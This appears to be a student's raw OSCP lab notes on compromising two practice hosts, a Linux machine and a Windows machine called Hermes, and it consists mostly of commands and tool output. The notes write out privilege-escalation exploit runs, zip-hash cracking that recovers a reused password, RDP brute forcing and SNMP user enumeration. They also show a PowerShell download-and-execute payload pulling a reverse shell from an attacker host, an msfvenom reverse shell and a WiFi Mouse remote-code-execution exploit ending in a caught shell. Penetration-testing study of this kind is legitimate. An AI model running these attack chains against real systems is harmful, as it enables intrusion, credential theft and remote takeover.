+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+stuart@oscp:/home$ ss -ntplu
+Netid    State     Recv-Q    Send-Q       Local Address:Port       Peer Address:Port   Process   
+udp      UNCONN    0         0            127.0.0.53%lo:53              0.0.0.0:*                
+tcp      LISTEN    0         4096         127.0.0.53%lo:53              0.0.0.0:*                
+tcp      LISTEN    0         128                0.0.0.0:22              0.0.0.0:*                
+tcp      LISTEN    0         511                      *:80                    *:*                
+tcp      LISTEN    0         32                       *:21                    *:*                
+tcp      LISTEN    0         128                   [::]:22                 [::]:*     
+
+
+				USERS / CREDS: 
+stuart@oscp:/home$ ls -la /etc/passwd
+-rw-r--r-- 1 root root 2010 Nov 18  2022 /etc/passwd
+
+stuart@oscp:/home$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+stuart:x:1000:1000:CClNW:/home/stuart:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+thato:x:1010:1010::/home/thato:/bin/bash
+chloe:x:1011:1011::/home/chloe:/bin/bash
+carla:x:1012:1012::/home/carla:/bin/bash
+
+
+
+				PRIV ESC: 
+stuart@oscp:~$ sudo -l
+[sudo] password for stuart: 
+Sorry, user stuart may not run sudo on oscp.
+
+stuart@oscp:/home$ uname -a
+Linux oscp 5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+stuart@oscp:/home$ cat /etc/issue
+Ubuntu 22.04.1 LTS \n \l
+
+stuart@oscp:~$ cd ..
+stuart@oscp:/home$ ls
+carla  chloe  stuart  thato
+stuart@oscp:/home$ cd carla
+-bash: cd: carla: Permission denied
+stuart@oscp:/home$ cd chloe
+-bash: cd: chloe: Permission denied
+stuart@oscp:/home$ cd thato
+-bash: cd: thato: Permission denied
+
+
+			# LINPEAS 
+python3 -m http.server 80
+stuart@oscp:/tmp$ wget http://192.168.45.157/linpeas.sh
+stuart@oscp:/tmp$ chmod +x linpeas.sh
+
+╔══════════╣ Environment
+OLDPWD=/opt/backup
+PWD=/tmp
+
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                               
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)                                             
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: probable
+   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-2586] nft_object UAF
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-0847] DirtyPipe
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: less probable
+   Tags: ubuntu=(20.04|21.04),debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+[+] [CVE-2021-4034] PwnKit
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: less probable
+   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: mint=19,ubuntu=18|20, debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                                                             
+vsftpd process found (dump creds from memory as root)                                            
+apache2 process found (dump creds from memory as root)
+sshd: process found (dump creds from memory as root)
+
+╔══════════╣ Users with console
+carla:x:1012:1012::/home/carla:/bin/bash                                                         
+chloe:x:1011:1011::/home/chloe:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+stuart:x:1000:1000:CClNW:/home/stuart:/bin/bash
+thato:x:1010:1010::/home/thato:/bin/bash
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r-- 1 root root 3771 Jan  6  2022 /etc/skel/.bashrc                                       
+-rw-r--r-- 1 stuart stuart 3771 Jan  6  2022 /home/stuart/.bashrc
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1405/etc/skel/.bashrc
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1695/etc/skel/.bashrc
+
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 stuart stuart 26890 Apr  5  2018 /opt/backup/sitebackup1.zip
+-rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 /opt/backup/sitebackup3.zip
+-rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 /opt/backup/sitebackup2.zip
+
+
+
+			# SUID enabled binaries: 
+stuart@oscp:/home$ find / -perm -u=s -type f 2> /dev/null
+/usr/libexec/polkit-agent-helper-1
+
+			# CVE-2021-3560 
+PolicyKit polkit-1 < 0.101 - Local Privilege Escalation
+https://www.exploit-db.com/exploits/17932
+
+stuart@oscp:/home$ cat /etc/issue
+Ubuntu 22.04.1 LTS \n \l
+
+stuart@oscp:/home$ pkexec --version
+pkexec version 0.105
+
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ gcc 17932.c -o pwnit
+
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+stuart@oscp:/tmp$ wget http://192.168.45.157/pwnit
+
+stuart@oscp:/tmp$ chmod +x pwnit
+
+stuart@oscp:/tmp$ ./pwnit 
+=============================
+=      PolicyKit Pwnage     =
+=          by zx2c4         =
+=        Sept 2, 2011       =
+=============================
+[+] Configuring inotify for proper pid.
+[+] Launching pkexec.
+			DIDNT WORK: VERSION
+
+Polkit 0.105-26 0.117-2 - Local Privilege Escalation
+https://www.exploit-db.com/exploits/50011
+
+stuart@oscp:/home$ cat /etc/issue
+Ubuntu 22.04.1 LTS \n \l
+
+stuart@oscp:/home$ pkexec --version
+pkexec version 0.105
+
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ chmod +x 50011.sh 
+
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+stuart@oscp:/tmp$ wget http://192.168.45.157/50011.sh
+stuart@oscp:/tmp$ chmod +x 50011.sh
+stuart@oscp:/tmp$ ./50011.sh
+stuart@oscp:/tmp$ su hacker
+password
+echo "[*] Run 'su - $userName', followed by 'sudo su' to gain root access"
+			DIDNT WORK:
+
+
+			# Files of interest
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 stuart stuart 26890 Apr  5  2018 /opt/backup/sitebackup1.zip
+-rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 /opt/backup/sitebackup3.zip
+-rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 /opt/backup/sitebackup2.zip
+
+stuart@oscp:/tmp$ find / -name "*.zip" -ls 2> /dev/null
+   131077     28 -rw-r--r--   1 stuart   stuart      26890 Apr  5  2018 /opt/backup/sitebackup1.zip
+   131076     28 -rw-r--r--   1 stuart   stuart      25312 Mar  5  2020 /opt/backup/sitebackup3.zip
+   131078     28 -rw-r--r--   1 stuart   stuart      24701 Nov 18  2022 /opt/backup/sitebackup2.zip
+
+stuart@oscp:/opt/backup$ ls
+sitebackup1.zip  sitebackup2.zip  sitebackup3.zip
+
+			# TRANSFER FILES TO KALI 
+kali㉿kali~ $ systemctl status ssh
+kali㉿kali~ $ systemctl start ssh 
+kali㉿kali~ $ pwd
+stuart@oscp:/opt/backup$ scp ./sitebackup3.zip kali@192.168.45.157:/home/kali/Desktop
+stuart@oscp:/opt/backup$ scp ./sitebackup2.zip kali@192.168.45.157:/home/kali/Desktop
+stuart@oscp:/opt/backup$ scp ./sitebackup1.zip kali@192.168.45.157:/home/kali/Desktop
+kali㉿kali~ $ systemctl kill ssh  
+kali㉿kali~ $ systemctl status ssh
+
+			# PASSWORD PROTECTED  
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ unzip sitebackup3.zip
+   skipping: joomla/.DS_Store        need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/LICENSE.txt      need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/README.txt       need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/cache/index.html  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/cli/index.html   need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/cli/joomla.php   need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/configuration.php  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/htaccess.txt     need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/includes/app.php  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/includes/defines.php  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/includes/framework.php  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/includes/index.html  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/index.php        need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/language/.DS_Store  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/language/index.html  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/language/overrides/index.html  need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/robots.txt       need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/tmp/index.html   need PK compat. v5.1 (can do v4.6)
+   skipping: joomla/web.config.txt   need PK compat. v5.1 (can do v4.6)
+
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ zip2john sitebackup3.zip > zip3.hash
+
+I found the sitebackup3.zip and used zip2john to extract the hashes. There are over 19 different hashes in here.
+My method was to take each hash from beginning $zip2$ to ending $zip2$ and put it into a separate file for hashcat to crack on my host. 
+
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt 19.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
+Cost 1 (HMAC size) is 846 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+codeblue         (?)     
+1g 0:00:00:00 DONE (2024-05-05 02:09) 1.111g/s 47786p/s 47786c/s 47786C/s holabebe..harder
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(kali㉿kali)-[~/Desktop/A/144]
+└─$ 7z e sitebackup3.zip   
+Enter password (will not be echoed): codeblue
+
+FILE: configuration.php
+	public $secret = 'Ee24zIK4cDhJHL4H';
+	public $gzip = false;
+	public $error_reporting = 'default';
+	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
+	public $offset = 'UTC';
+	public $mailonline = true;
+	public $mailer = 'mail';
+	public $mailfrom = 'chloe@challenge.lab';
+
+	public $dbtype = 'mysql';
+	public $host = 'localhost';
+	public $user = 'joomla';
+	public $password = 'Password@1';
+
+
+				Proof.txt
+stuart@oscp:/opt/backup$ su chloe
+Password: Ee24zIK4cDhJHL4H
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+chloe@oscp:/opt/backup$ whoami
+chloe
+
+chloe@oscp:/opt/backup$ hostname
+oscp
+
+chloe@oscp:/opt/backup$ id
+uid=1011(chloe) gid=1011(chloe) groups=1011(chloe),27(sudo)
+
+chloe@oscp:/opt/backup$ cat /root/proof.txt
+cat: /root/proof.txt: Permission denied
+
+chloe@oscp:/opt/backup$ sudo -l
+[sudo] password for chloe: Ee24zIK4cDhJHL4H
+Matching Defaults entries for chloe on oscp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+User chloe may run the following commands on oscp:
+    (ALL : ALL) ALL
+
+chloe@oscp:/opt/backup$ sudo cat /root/proof.txt
+176c97d342b92b91ac81d6b335864d8a
+
+
+--------------------------------------------------------------------------------------------------
+				Hermes: 192.168.214.145 ✅
+NMAP: 
+- FTP:21
+- RDP:3389
+- HTTP:80
+- UNISQL:1978
+- SMB:139, 445
+- RPC:135
+- SNMP: 161
+
+					TCP:
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.225.145
+
+21/tcp   open  ftp           syn-ack Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+
+80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: Samuel's Personal Site
+|_http-server-header: Microsoft-IIS/10.0
+
+1978/tcp open  unisql?       syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, DistCCD, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Hello, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NessusTPv10, NessusTPv11, NessusTPv12, NotesRPC, OfficeScan, RPCCheck, RTSPRequest, Radmin, SIPOptions, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, Socks4, Socks5, TLSSessionReq, TerminalServer, TerminalServerCookie, Verifier, VerifierAdvanced, WMSRequest, WWWOFFLEctrlstat, X11Probe, mydoom, oracle-tns: 
+|_    system windows 6.2
+
+RDP:
+3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+| ssl-cert: Subject: commonName=oscp
+| Issuer: commonName=oscp
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-03-29T12:05:41
+| Not valid after:  2024-09-28T12:05:41
+| MD5:   bdc7:72cd:7225:0a3b:a05c:a21b:dca3:39ec
+| SHA-1: c043:a521:829d:b3e8:3cdf:972f:eecd:85f7:16f2:b89c
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: oscp
+|   DNS_Computer_Name: oscp
+|   Product_Version: 10.0.19041
+|_  System_Time: 2024-05-04T01:21:03+00:00
+|_ssl-date: 2024-05-04T01:21:42+00:00; -2s from scanner time.
+1 service unrecognized despite returning data. If you know the service/version, please submit the 
+
+SMB: 
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 6279/tcp): CLEAN (Timeout)
+|   Check 2 (port 2253/tcp): CLEAN (Timeout)
+|   Check 3 (port 25913/udp): CLEAN (Timeout)
+|   Check 4 (port 29010/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: -1s, deviation: 0s, median: -2s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-05-04T01:21:06
+|_  start_date: N/A
+
+RPC:
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+
+
+				UDP: 
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sU -O 192.168.214.145
+
+PORT    STATE SERVICE
+161/udp open  snmp
+
+
+				FTP:21- EMPTY 
+https://www.youtube.com/watch?v=i5furEJlySY
+
+ftp 192.168.214.145 
+anonymous:anonymous
+ftp> passive
+ftp> dir
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+
+
+wget -m ftp://anonymous:anonymous@192.168.225.145
+
+ftp> binary
+ftp> put /home/kali/Desktop/A/winPEASx86.exe
+
+
+				RDP: NOOTHING 
+BRUTE FORCE:
+hydra -l samuel -P /usr/share/wordlists/rockyou.txt rdp://192.168.214.145
+
+
+				SMB: NOTHING INTERESTING 
+crackmapexec smb 192.168.214.145
+smbmap -H 192.168.214.145
+smbmap -H 192.168.214.145 -u null
+smbmap -H 192.168.214.145 -u null -p null
+smbclient -L \\\\192.168.214.145\\
+enum4linux -n 192.168.214.145
+enum4linux -a 192.168.214.145
+impacket-smbclient samuel@192.168.214.145
+Password:
+
+				SNMP: zachary
+https://www.youtube.com/watch?v=qt7XkD2Ly54
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -c public -v1 -t 10 192.168.214.145
+iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19041 Multiprocessor Free)"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
+iso.3.6.1.2.1.1.3.0 = Timeticks: (315987854) 36 days, 13:44:38.54
+iso.3.6.1.2.1.1.4.0 = STRING: "zachary"
+iso.3.6.1.2.1.1.5.0 = STRING: "oscp"
+iso.3.6.1.2.1.1.6.0 = STRING: "localhost"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 79
+iso.3.6.1.2.1.2.1.0 = INTEGER: 23
+
+# Using snmpwalk to enumerate Windows users
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -c public -v1 192.168.214.145 1.3.6.1.4.1.77.1.2.25
+iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
+iso.3.6.1.4.1.77.1.2.25.1.1.6.111.102.102.115.101.99 = STRING: "offsec"
+iso.3.6.1.4.1.77.1.2.25.1.1.7.122.97.99.104.97.114.121 = STRING: "zachary"
+iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
+iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
+iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
+
+# Using snmpwalk to enumerate Windows processes
+snmpwalk -c public -v1 192.168.214.145 1.3.6.1.2.1.25.4.2.1.2
+
+# Using snmpwalk to enumerate installed software
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -c public -v1 192.168.214.145 1.3.6.1.2.1.25.6.3.1.2
+iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "PuTTY release 0.76 (64-bit)"
+iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "VMware Tools"
+iso.3.6.1.2.1.25.6.3.1.2.3 = STRING: "Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127"
+iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127"
+iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Update Health Tools"
+iso.3.6.1.2.1.25.6.3.1.2.6 = STRING: "Update for Windows 10 for x64-based Systems (KB5001716)"
+iso.3.6.1.2.1.25.6.3.1.2.7 = STRING: "Microsoft Edge"
+iso.3.6.1.2.1.25.6.3.1.2.8 = STRING: "Microsoft Edge Update"
+iso.3.6.1.2.1.25.6.3.1.2.9 = STRING: "Microsoft Edge WebView2 Runtime"
+iso.3.6.1.2.1.25.6.3.1.2.10 = STRING: "Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.24.281"
+iso.3.6.1.2.1.25.6.3.1.2.11 = STRING: "Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127"
+iso.3.6.1.2.1.25.6.3.1.2.12 = STRING: "Mouse Server version 1.7.8.5"
+iso.3.6.1.2.1.25.6.3.1.2.13 = STRING: "Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.281"
+iso.3.6.1.2.1.25.6.3.1.2.14 = STRING: "Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127"
+
+# Using snmpwalk to enumerate open TCP ports
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -c public -v1 192.168.214.145 1.3.6.1.2.1.6.13.1.3
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.0 = INTEGER: 21 - FTP 
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.0 = INTEGER: 80 - HHTP
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.0 = INTEGER: 135 - SMB
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.445.0.0.0.0.0 = INTEGER: 445 - SMB
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.1978.0.0.0.0.0 = INTEGER: 1978 - UniSQL
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.3389.0.0.0.0.0 = INTEGER: 3389 - RDP
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.5040.0.0.0.0.0 = INTEGER: 5040 - RPC
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.49664.0.0.0.0.0 = INTEGER: 49664
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.49665.0.0.0.0.0 = INTEGER: 49665
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.49666.0.0.0.0.0 = INTEGER: 49666
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.49667.0.0.0.0.0 = INTEGER: 49667
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.49668.0.0.0.0.0 = INTEGER: 49668
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.49669.0.0.0.0.0 = INTEGER: 49669
+iso.3.6.1.2.1.6.13.1.3.0.0.0.0.49670.0.0.0.0.0 = INTEGER: 49670
+iso.3.6.1.2.1.6.13.1.3.192.168.214.145.139.0.0.0.0.0 = INTEGER: 139 - NetBIOS
+iso.3.6.1.2.1.6.13.1.3.192.168.214.145.54647.20.12.23.50.443 = INTEGER: 54647
+iso.3.6.1.2.1.6.13.1.3.192.168.214.145.54648.43.132.80.175.80 = INTEGER: 54648
+
+
+				HTTP: 80
+SAMUEL HAYNES
+http://192.168.214.145 
+
+Font scripts
+- Google Font API
+Font Awesome
+- Web servers 
+- IIS 10.0
+Operating systems
+- Windows Server
+CDN
+- jsDelivr
+UI frameworks
+- Bootstrap 5.0.2
+
+# DIR BRUTE FORCE : nothing interesting 
+feroxbuster -u http://192.168.214.145 -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Bootstrap       
+Bootstrapy CMS - Multiple SQL Injection                        | php/webapps/46590.txt
+e107 2 Bootstrap CMS - Cross-Site Scripting                    | php/webapps/35679.txt
+
+
+				UNISQL: 1978
+┌──(kali㉿kali)-[~]
+└─$ searchsploit unisql
+Exploits: No Results
+Shellcodes: No Results
+
+Google:
+WiFi Mouse 1.7.8.5 - Remote Code Execution
+https://www.exploit-db.com/exploits/49601
+
+WiFiMouse 1.8.3.4 - Remote Code Execution (RCE)
+https://www.exploit-db.com/exploits/51016
+
+RemoteMouse 3.008 - Arbitrary Remote Command Execution
+https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
+https://www.exploit-db.com/exploits/46697
+Edit payload:
+cmd = "powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://192.168.45.229:8000/revshell.ps1')\""
+chmod +x RemoteMouse-3.008-Exploit.py
+./RemoteMouse-3.008-Exploit.py -v -t 192.168.214.145 
+                                                                              
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ searchsploit WiFi Mouse 
+WiFi Mouse 1.7.8.5 - Remote Code Execution                     | windows/remote/49601.py
+WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                 | windows/remote/50972.py
+WiFi Mouse 1.8.3.2 - Remote Code Execution (RCE)               | windows/remote/51072.py
+WiFiMouse 1.8.3.4 - Remote Code Execution (RCE)                | windows/remote/51016.sh
+
+
+			WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)
+			https://www.exploit-db.com/exploits/50972
+https://www.linkedin.com/posts/hamdi-mohamed-tn_exploit-title-wifi-mouse-17-8-5-remote-activity-7135395877166202880-X7Ca?trk=public_profile_like_view
+https://stackoverflow.com/questions/65772708/how-do-i-get-rid-of-u200b-unicode-zero-width-space-in-my-code
+
+50972.py
+the stageless non-meterpreter (retrieved from revshells.com) works 
+
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=4444 -f exe -o reverse.exe
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ chmod +x 50972.py   
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ chmod +x reverse.exe
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ python3 -m http.server 80
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ nc -nvlp 4444
+
+# RUN AS SUDO:
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ sudo python3 50972.py 192.168.214.145 192.168.45.229:80 reverse.exe
+[+] 3..2..1..
+[+] *Super fast hacker typing*
+[+] Retrieving payload
+[+] Done! Check Your Listener?
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.229] from (UNKNOWN) [192.168.214.145] 55032
+
+C:\WINDOWS\system32> whoami
+oscp\offsec
+
+C:\WINDOWS\system32> hostname
+oscp
+
+C:\WINDOWS\system32> powershell -ep bypass
+
+PS C:\Users\Offsec\Desktop> cat local.txt
+01af8966cf14655225682a63918be97c
+
+PS C:\Users\offsec\Desktop> systeminfo
+systeminfo
